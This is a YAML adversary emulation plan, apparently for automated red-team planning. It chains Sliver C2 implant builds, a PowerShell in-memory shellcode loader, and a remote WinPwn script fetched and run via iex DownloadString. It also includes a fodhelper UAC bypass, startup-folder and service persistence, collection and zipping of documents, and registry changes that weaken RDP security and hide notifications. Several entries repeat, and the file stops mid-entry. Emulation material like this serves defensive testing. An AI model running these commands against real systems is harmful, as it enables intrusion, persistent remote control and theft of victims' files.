emulation_plan_details:
  adversary_name: '88'
  creation_time: 2025-06-26 11:19:22 UTC+0000
attack_action_sequence:
  - uuid: 2a602f8e-4d1f-49f1-b3b8-4b74f67cb63a
    name: Build Shellcode for the Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a shellcode payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (shellcode_payload ?p - payload)
      - (file_payload ?p - payload ?file - file)
      - (bin_blob_file ?file - file)
      - (file_prepared_local ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 0617285b-6005-4a73-83c5-d4dc86fcdc35
    name: Simulate the victim executes a shellcode payload (Windows)
    id:
      - T1059.001
      - T1620
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Defense Evasion
    technique:
      - 'Command and Scripting Interpreter: PowerShell'
      - Reflective Code Loading
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, open a powershell and execute these scripts)

        $s=[System.IO.File]::ReadAllBytes('#{SAVE_PATH}');
        $c='using System;using System.Runtime.InteropServices;public class W{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr a,uint b);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';Add-Type -TypeDefinition $c;$hwnd=[W]::GetConsoleWindow();if($hwnd -ne [IntPtr]::Zero){[W]::ShowWindow($hwnd,0)};
        $p=[W]::VirtualAlloc(0,$s.Length,0x3000,0x40);
        [System.Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);
        $h=[W]::CreateThread(0,0,$p,0,0,0);[W]::WaitForSingleObject($h,0xFFFFFFFF)
    arguments:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded shellcode payload file
        type:
    preconditions:
      - (file_exists ?path - path ?file - file ?t - host)
      - (bin_blob_file ?file - file)
    effects:
      - (file_executed ?file - file ?t - host)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Executor
      command: powershell(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (powershell ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
    name: WinPwn - General privesc checks
    id:
      - T1082
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - System Information Discovery
    description: General privesc checks using the otherchecks function of WinPwn
    execution:
      executor: Powershell Executor
      command: |-
        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (system_time_info_known ?target - host)
  - uuid: 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8
    name: Enumerate Active Directory Groups with Get-AdGroup
    id:
      - T1069.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - 'Permission Groups Discovery: Domain Groups'
    description: |
      The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
      Upon successful execution a listing of groups will output with their paths in AD.
      Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps
    execution:
      executor: Powershell Executor
      command: |
        Get-AdGroup -Filter *
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (local_permission_groups_info_known ?target - host)
  - uuid: bc50eb97-4a6d-4a9d-b0b2-e9cf623a9106
    name: Build the executable file (service) of a Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a service executable payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format service --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (service_payload ?p - payload)
      - (file_payload ?p - payload ?file - file)
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 8834b65a-f808-4ece-ad7e-2acdf647aafa
    name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
    id:
      - T1547.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Persistence
      - Privilege Escalation
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V "Startup" value 
      to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart
    execution:
      executor: Powershell Executor
      command: |
        New-Item -ItemType Directory -path "#{new_startup_folder}"
        Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
    arguments:
      new_startup_folder:
        description: new startup folder to replace standard one
        type: string
        default: $env:TMP\atomictest
      payload:
        description: 'executable to be placed in new startup location '
        type: string
        default: C:\Windows\System32\calc.exe
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (file_exists ?payload - path ?file - file ?target - host)
      - (exe_file ?file - file)
    effects:
      - (file_execution_at_startup ?file - file ?target - host)
  - uuid: f7f31777-1bbf-4ddc-b7a1-af9f46a5299b
    name: Obtain a persistent Sliver Executor
    id:
      - 
    source: Manual
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Persistence
    technique:
      - 
    description: |
      Obtain the persistency of Sliver Executor via scheduled payload file execution.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?f - file)
      - operator: or
        operands:
          - (file_execution_at_time ?f - file ?target - host)
          - (file_execution_at_startup ?f - file ?target - host)
      - (unallocated ?s - executor)
    effects:
      - (persistent_sliver_session ?s - executor ?target - host)
      - ~(unallocated ?s - executor)
  - uuid: d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
    name: Search files of interest and save them to a single zip file (Windows)
    id:
      - T1005
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Data from Local System
    description: |
      This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              
    execution:
      executor: Powershell Executor
      command: |
        $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}
    arguments:
      output_zip_folder_path:
        description: Path to directory for saving the generated zip file
        type: Path
        default: PathToAtomicsFolder\..\ExternalPayloads\T1005
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
    effects:
      - (certain_extension_data_saved ?file - file ?target - host)
      - (file_exists ?output_zip_folder_path - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: 2e8f1a9c-0b5e-4a7c-b6d4-9a8b2d3c5f1e
    name: Create Directory
    id:
      - T1106
    source: Sliver
    supported_platforms:
      - windows
      - linux
    tactics:
      - Persistence
    technique:
      - File System Permissions Modification
    description: The `mkdir` command creates a new directory on the target system.
    execution:
      executor: Sliver Executor
      command: mkdir (#{remote_path},#{SessionID})
    arguments:
      remote_path:
        description: Full path of the directory to create
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - operator: or
        operands:
          - (os_windows ?target - host)
          - (os_linux ?target - host)
      - (sliver_session ?executorID - executor ?target - host)
    effects:
      - (dir_exists ?path - path ?dir - dir ?target - host)
  - uuid: a57fbe4b-3440-452a-88a7-943531ac872a
    name: Zip a Folder with PowerShell for Staging in Temp
    id:
      - T1074.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - 'Data Staged: Local Data Staging'
    description: |
      Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
      was placed in the temp directory.
    execution:
      executor: Powershell Executor
      command: |
        Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
    arguments:
      output_file:
        description: Location to save zipped file or folder
        type: path
        default:
      input_file:
        description: Location of file or folder to zip
        type: path
        default:
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (dir_exists ?input_file - path ?dir - dir ?target - host)
    effects:
      - (dir_data_saved ?dir - dir ?file - file)
      - (file_exists ?output_file - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (command_prompt ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 4b81bcfa-fb0a-45e9-90c2-e3efe5160140
    name: Disable Remote Desktop Security Settings Through Registry
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation
    execution:
      executor: Command Prompt Executor
      command: |
        reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (rdp_security_settings_disabled ?target - host)
  - uuid: 0cc88118-410f-49e5-aa53-3726df4c8d48
    name: Simulate the victim accidentally creates a new service based on a service
      payload file
    id:
      - T1204.002
      - T1543.003
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Persistence
    technique:
      - 'User Execution: Malicious File'
      - 'Create or Modify System Process: Windows Service'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, open a powershell as the administrator and run the following commands)

        sc create sliver_svc binPath= "#{SAVE_PATH}" start= auto
        sc start sliver_svc
    arguments:
      SAVE_PATH:
        default:
        description: Saved path of the service executable payload file
        type:
    preconditions:
      - (service_payload ?p - payload)
      - (file_payload ?p - payload ?file - file)
      - (file_exists ?path - path ?file - file ?t - host)
    effects:
      - (file_executed ?file - file ?t - host)
  - uuid: 3f627297-6c38-4e7d-a278-fc2563eaaeaa
    name: Bypass UAC using Fodhelper - PowerShell
    id:
      - T1548.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
      - Privilege Escalation
    technique:
      - 'Abuse Elevation Control Mechanism: Bypass User Account Control'
    description: |
      PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
      Upon execution command prompt will be opened.
    execution:
      executor: Powershell Executor
      command: |
        New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
        New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
        Start-Process "C:\Windows\System32\fodhelper.exe"
    arguments:
      executable_binary:
        description: Binary to execute with UAC Bypass
        type: path
        default: C:\Windows\System32\cmd.exe
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (file_exists ?executable_binary - path ?file - file ?target - host)
      - operator: or
        operands:
          - (exe_file ?file - file)
    effects:
      - (file_executed_as_root ?file - file ?target - host)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (command_prompt ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 3e757ce7-eca0-411a-9583-1c33b8508d52
    name: Windows HideSCANetwork Group Policy Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. 
      Take note that some Group Policy changes might require a restart to take effect.
      See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (networking_icon_group_policy_disabled ?target - host)
  - uuid: 003f466a-6010-4b15-803a-cbb478a314d7
    name: Disable Windows Toast Notifications
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.
      See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (toast_notification_disabled ?target - host)
  - uuid: bb2176c4-855e-4b52-ab03-5fe2e58d8129
    name: Build DLL Sliver implant
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?file - file)
      - (dll_file ?file - file)
      - (file_prepared_local ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
    name: Search files of interest and save them to a single zip file (Windows)
    id:
      - T1005
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Data from Local System
    description: |
      This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              
    execution:
      executor: Powershell Executor
      command: |
        $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}
    arguments:
      output_zip_folder_path:
        description: Path to directory for saving the generated zip file
        type: Path
        default: PathToAtomicsFolder\..\ExternalPayloads\T1005
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
    effects:
      - (certain_extension_data_saved ?file - file ?target - host)
      - (file_exists ?output_zip_folder_path - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Executor
      command: powershell(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (powershell ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: bb2176c4-855e-4b52-ab03-5fe2e58d8129
    name: Build DLL Sliver implant
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?file - file)
      - (dll_file ?file - file)
      - (file_prepared_local ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
    name: Simulate the victim download and execute malicious payload file as Admin
      (Root)
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
    arguments:
      HOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - (unallocated ?path - path)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
      - (file_executed ?file - file ?t - host)
      - (file_executed_as_root ?f - file ?t - host)
      - ~(unallocated ?path - path)
  - uuid: b52e0d1e-a1d2-4299-9a38-cb9d2a7c8ce0
    name: Upload to Remote Path
    id:
      - T1105
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Command and Control
    technique:
      - Ingress Tool Transfer
    description: The `upload <remote_path, data, is_ioc>` function writes data to
      the specified path on the remote file system. Parameters include remote_path
      (remote path), data (data to write), and is_ioc (data is an indicator of compromise).
    execution:
      executor: Sliver Executor
      command: |
        upload(#{RemotePath}, #{Data}, #{IsIOC})
    arguments:
      RemotePath:
        description: Remote path
      Data:
        description: Data to write
      IsIOC:
        description: Data is an indicator of compromise
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
      - (file_prepared_local ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 08f66886-0e96-455b-be31-b0af37db8e23
    name: Set a universal payload handler using MSF exploit/multi/handler module
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Command and Control
    technique:
      - Windows Command Shell
      - Ingress Tool Transfer
      - Non-Standard Por
    description: |
      In Metasploit, the exploit/multi/handler module is essentially a universal payload handler.
      Unlike most exploit modules in Metasploit that target specific vulnerabilities, multi/handler does not exploit a particular service or software.
      Instead, its main purpose is to listen for incoming connections from payloads that you have already delivered to a target by some other means.
    execution:
      executor: Metasploit Executor
      command: |
        exploit_and_execute_payload(target = None,
                                    exploit_module_name = "exploit/multi/handler",
                                    payload_module_name = "#{payload_name}",
                                    listening_host = "#{LHOST}",
                                    listening_port = "#{LPORT}"):
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      payload_name:
        default:
        description: payload type set by msf
        type:
    preconditions:
    effects:
      - (payload_handler_set ?p - payload)
  - uuid: b8cbd2a9-6967-4114-b2b5-162098f74a89
    name: Take Screenshot
    id:
      - T1113
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Collection
    technique:
      - Screen Capture
    description: The `screenshot()` function takes a screenshot of the remote system
      with screenshot data in PNG format.
    execution:
      executor: Sliver Executor
      command: screenshot(#{SessionID})
    arguments:
      SessionID:
        default:
        description: The session ID of the active Sliver connection.
        type:
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (screenshot_data_saved ?file - file ?t - host)
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
